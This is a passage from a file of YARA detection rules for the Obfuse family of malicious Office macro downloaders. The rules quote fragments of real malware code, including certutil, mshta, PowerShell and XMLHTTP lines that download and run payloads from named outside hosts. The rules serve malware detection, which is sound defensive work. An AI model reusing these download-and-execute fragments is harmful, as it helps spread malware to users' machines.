        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"c:\\programdata\\mnyJk.pdf\"" ascii //weight: 1
        $x_1_2 = "btOlx(PDMzg).exec (quldd)" ascii //weight: 1
        $x_1_3 = "= tjdIN(VMmCU) & \" \" & aVzLk" ascii //weight: 1
        $x_1_4 = "= CreateObject(GzkBN(3) & \".\" & GzkBN(3) & \"request.5.1\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_36
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Open \"C:\\ProgramData\\Blobers.vbs\"" ascii //weight: 1
        $x_1_2 = "Set Mamters = CreateObject(UserForm1.Tag)" ascii //weight: 1
        $x_1_3 = "Mamters.Exec UserForm1.Label1.Tag" ascii //weight: 1
        $x_1_4 = "Open \"C:\\ProgramData\\FErio.vbs\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_37
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Document.Application.ShellExecute \"cmd.exe\"" ascii //weight: 1
        $x_1_2 = "/c certutil -urlcache -split -f" ascii //weight: 1
        $x_1_3 = {68 74 74 70 73 3a 2f 2f 64 6f 63 73 2e 69 74 73 68 65 61 6c 74 68 70 72 6f 2e 63 6f 6d 2f 65 6e 64 70 6f 69 6e 74 2f [0-10] 2e 6a 73}  //weight: 1, accuracy: Low
        $x_1_4 = "del %temp%\\jscript.js" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_38
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= rojuubaswhyl & Chr$(Val(\"&H\" & Mid$(bcxpunnshecv, skrtdobqxfii, 2)))" ascii //weight: 1
        $x_1_2 = "= 1 To Len(gzjgsohvhjxc) Step 2" ascii //weight: 1
        $x_1_3 = "= Space(FileLen" ascii //weight: 1
        $x_1_4 = "Sleep sleepNbSeconds * 1000" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_39
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= gogo.Create(\"mshta http:\\\\j.mp/4sdn4sknk4nskf\", Null, objConfig, intgogoID)" ascii //weight: 1
        $x_1_2 = "= love2.Get(\"Win32_Process\")" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"WbemScripting.SWbemLocator\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_40
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"c0:1\\bpcr3o0gfreadm7d1a7tea1\\f4941815392.2j4pcg9\"" ascii //weight: 1
        $x_1_2 = "Set e4af3d7d = CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_3 = "Call e4af3d7d.exec(c758ca0a & \" \" & d0ade792(d6a07b6a))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_41
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"cc:6\\1p6rcoag1reabm7dfa3taa8\\667276f197d.3j1p7gd\"" ascii //weight: 1
        $x_1_2 = "Set afdd8d1a = CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_3 = "Call afdd8d1a.exec(c07ec2e8 & \" \" & eac918e1(b08f0ba1))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_42
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Open \"C:\\ProgramData\\Kolester.vbs\"" ascii //weight: 1
        $x_1_2 = "Open \"C:\\ProgramData\\Helpot.vbs\"" ascii //weight: 1
        $x_1_3 = "= CreateObject(Biloder.Montelar.ControlTipText)" ascii //weight: 1
        $x_1_4 = ".Exec ThisDocument.DefaultTargetFrame" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_43
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Open \"C:\\ProgramData\\Kolester.vbs\"" ascii //weight: 1
        $x_1_2 = "Open \"C:\\ProgramData\\Helpot.vbs\"" ascii //weight: 1
        $x_1_3 = "= CreateObject(ThisDocument.XMLSaveThroughXSLT)" ascii //weight: 1
        $x_1_4 = ".Exec ThisDocument.DefaultTargetFrame" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_44
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Run PINCHPENNY_ENLARDING_TELESES_T.FLINDERAURORALPYROSTATS" ascii //weight: 1
        $x_1_2 = ".SaveToFile swainishnesses_mausolea.finocchioduckiestanagrammatise()" ascii //weight: 1
        $x_1_3 = "Debug.Print Len(.responseBody)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_45
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"InternetExplorer.Application\")" ascii //weight: 1
        $x_1_2 = ".Navigate \"https://pastebin.com/raw/b82VVfcZ\"" ascii //weight: 1
        $x_1_3 = "Action.Path = \"C:\\Windows\\System32\\cmd.exe /q /c %TEMP%\\launcher.bat\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_46
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "XMLHTTP.Open \"GET\", Replace(\"http://nadim.work/demo.doc\", \"\\\", \"/\"), \"False\"" ascii //weight: 1
        $x_1_2 = "ADOStream.SaveToFile \"C:\\Windows\\Temp\\tmp.doc\", 2" ascii //weight: 1
        $x_1_3 = "FileName:=\"C:\\Windows\\Temp\\tmp.doc\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_47
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"wcatsmdogsfeet:\\\\.\\root\\CIMV2\"" ascii //weight: 1
        $x_1_2 = "= Replace(str, \"inperil\", Mid(LCase(decryptValue), 1, 3))" ascii //weight: 1
        $x_1_3 = "= \"pownophidcomm;iex $ellersh\"" ascii //weight: 1
        $x_1_4 = "si.STARTUPINFO.wShowWindow = SW_HIDE" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_48
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "URL = \"http://warzywkamylove.5v.pl/core.exe\"" ascii //weight: 1
        $x_1_2 = "WinHttpReq.Open \"GET\", URL, False" ascii //weight: 1
        $x_1_3 = "Call Shell(\"cmd.exe /c chcp 1250 & cd \" & Path & \" & core.exe /stext dump.txt\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_49
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call a201654f.exec(bac7d46d)" ascii //weight: 1
        $x_1_2 = "c87b2cea.c0c7d725 a0a66cd9 & \" \" & b3ad2efa" ascii //weight: 1
        $x_1_3 = "a0a66cd9 = a90626cc(ActiveDocument.Shapes(1).Title)" ascii //weight: 1
        $x_1_4 = "b3ad2efa = Environ(\"temp\") & \"\\main.theme\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_50
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call d38335ab.exec(bba7810b)" ascii //weight: 1
        $x_1_2 = "d4c07551 = Environ(\"temp\") & \"\\main.theme\"" ascii //weight: 1
        $x_1_3 = "f30492bd = f5d6160e(ActiveDocument.Shapes(1).Title)" ascii //weight: 1
        $x_1_4 = "a0e16723.d2ca86e7 f30492bd & \" \" & d4c07551" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_51
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call eebd3714.exec(d3585d61)" ascii //weight: 1
        $x_1_2 = "d3bd3261.d397dc8c c21c759a & \" \" & a47d384a" ascii //weight: 1
        $x_1_3 = "a47d384a = Environ(\"temp\") & \"\\main.theme\"" ascii //weight: 1
        $x_1_4 = "c21c759a = a0ea221b(ActiveDocument.Shapes(1).Title)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_52
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = "= ActiveDocument.Shapes(a22ca71f).AlternativeText" ascii //weight: 1
        $x_1_3 = "Call e35ffe14.exec(c206e10e)" ascii //weight: 1
        $x_1_4 = "= ActiveDocument.Shapes(a22ca71f).Title + \" \" + cef4cfef" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_53
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = "= ActiveDocument.Shapes(a22ca71f).AlternativeText" ascii //weight: 1
        $x_1_3 = "Call ecb542c8.exec(f2c8aa52)" ascii //weight: 1
        $x_1_4 = "= ActiveDocument.Shapes(a22ca71f).Title + \" \" + cef4cfef" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_54
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ea586348 = Environ(\"temp\") & \"\\main.theme\"" ascii //weight: 1
        $x_1_2 = "f3dfc05b.a1e16d7f f68c2976 & \" \" & ea586348" ascii //weight: 1
        $x_1_3 = "f68c2976 = e0009e59(ActiveDocument.Shapes(1).Title)" ascii //weight: 1
        $x_1_4 = "Call f9b51638.exec(ea814351)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_55
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cc58bdc9.a70d1643 b2d3c563 & \" \" & e83efae5" ascii //weight: 1
        $x_1_2 = "Call cbda6546.exec(fa314fa6)" ascii //weight: 1
        $x_1_3 = "e83efae5 = Environ(\"temp\") & \"\\main.theme\"" ascii //weight: 1
        $x_1_4 = "b2d3c563 = ec0cd7b4(ActiveDocument.Shapes(1).Title)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_56
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "d90bfe2a.ee06e416 c00cdfdc & \" \" & ec651a95" ascii //weight: 1
        $x_1_2 = "ec651a95 = Environ(\"temp\") & \"\\main.theme\"" ascii //weight: 1
        $x_1_3 = "c00cdfdc = b5e5136f(ActiveDocument.Shapes(1).Title)" ascii //weight: 1
        $x_1_4 = "Call dc15fdf1.exec(aebe1867)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_57
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "dc0e62ef.c5546f04 a0e01a5d & \" \" & af37e5f8" ascii //weight: 1
        $x_1_2 = "Call d4a71a51.exec(c271b6e6)" ascii //weight: 1
        $x_1_3 = "af37e5f8 = Environ(\"temp\") & \"\\main.theme\"" ascii //weight: 1
        $x_1_4 = "a0e01a5d = cea78d61(ActiveDocument.Shapes(1).Title)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_58
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "lllllllll1l.Open Chr(71) & Chr(69) & Chr(84), llllllllll1, False" ascii //weight: 1
        $x_1_2 = "oStream.SaveToFile Chr(97) & Chr(100) & Chr(98) & Chr(46) & Chr(101) & Chr(120) & Chr(101), 2" ascii //weight: 1
        $x_1_3 = "lllllllll1l.send" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_59
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "Sheets(\"Foglio2\").Activate" ascii //weight: 2
        $x_2_2 = "= ThisWorkbook.Path & \"\\_svc\" & \"host.exe\"" ascii //weight: 2
        $x_1_3 = "= Shell(ThisWorkbook.Path & \".\\_svc\" & \"host.exe \" & \"-h 255.255.\" & \"255.255\" & \" -t 4\" & \" -p 80\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_60
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_2 = "= e8089998.c492b9b9(ActiveDocument.Shapes(ed71ee4c).AlternativeText)" ascii //weight: 1
        $x_1_3 = "Call fca518c1.exec(a04f613a)" ascii //weight: 1
        $x_1_4 = "= ActiveDocument.Shapes(1).Title + \" \" + f5d112a0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_61
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= b14ecb7e(\"c1:5\\2p1r4o9g4r4aam3d2act3a6\\f2d6f37628f.bj1p6g5\")" ascii //weight: 1
        $x_1_2 = "Set f556c11e = CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_3 = "d2d75194.ada2b7c3 f556c11e, b14ecb7e(\"e2x9ebc1\"), d9bd64b2 & \" \" & e75a56ba" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_62
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Document_Open()" ascii //weight: 1
        $x_1_2 = "Call Reenjoin" ascii //weight: 1
        $x_1_3 = "= GetObject(\"winmg\" & \"mts:\\\\\" & \".\" & \"\\ro\" & \"ot\\cim\" & \"v2\" & \":\" & \"Win3\" & \"2_Process\")" ascii //weight: 1
        $x_1_4 = "= StrConv(ActiveDocument.Variables(\"w38ea48e2cb\").Value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_63
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Document_Open()" ascii //weight: 1
        $x_1_2 = "Call Viscometry" ascii //weight: 1
        $x_1_3 = "= GetObject(\"winmg\" & \"mts:\\\\\" & \".\" & \"\\ro\" & \"ot\\cim\" & \"v2\" & \":\" & \"Win3\" & \"2_Process\")" ascii //weight: 1
        $x_1_4 = "= StrConv(ActiveDocument.Variables(\"zdd9575dbb8\").Value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_64
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(\"powershell.exe mkdir c:\\temp\")" ascii //weight: 1
        $x_1_2 = "(\"powershell.exe attrib +h +s c:\\temp\"), 0" ascii //weight: 1
        $x_1_3 = {3d 20 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 22 68 74 74 70 3a 2f 2f 34 35 2e 33 32 2e 32 31 38 2e 31 34 2f 72 61 6c 69 2e 65 78 65 22 2c 20 22 63 3a 5c 74 65 6d 70 5c [0-8] 2e 65 78 65 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {70 6f 77 65 72 73 68 65 6c 6c 2e 52 75 6e 20 22 63 6d 64 20 2f 4b 20 43 3a 5c 74 65 6d 70 5c [0-8] 2e 65 78 65 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_65
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
